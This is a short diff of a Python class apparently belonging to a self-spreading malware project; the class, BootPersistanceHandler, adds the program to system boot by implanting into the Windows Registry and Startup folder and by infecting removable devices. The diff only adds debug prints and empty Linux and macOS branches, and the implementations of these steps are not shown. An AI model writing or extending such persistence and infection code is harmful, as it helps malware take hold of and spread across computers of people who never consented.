@@ -17,9 +17,10 @@ except ImportError:
 
 # Assuming Windows only
 
-# TODO: Change to WindowsBootPersistHandler class
+# TODO: Change to WindowsBootPersistManager class
 
 class BootPersistanceHandler:
+
     WINDOWS_START_UP_FOLDER_PREFIX = ""
     WINDOWS_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
@@ -32,6 +33,8 @@ class BootPersistanceHandler:
 
     def addSelfToSystemToBoot(self):
         if (platform.system().lower() == "windows"):
+            print("We're on Windows...")
+
             # 1. Implant to Windows Registry
             if winreg is not None:
                 self.implantToRegistry()
@@ -50,6 +53,10 @@ class BootPersistanceHandler:
 
             # 6. Infect removable devices
             self.infectRemovableDevices()
+        elif (platform.system().lower() == "linux"):
+            print("We're on Linux...")
+        elif (platform.system().lower() == "darwin"):
+            print("We're on Mac OS X...")
 
     #
     # Implant to Windows Registry
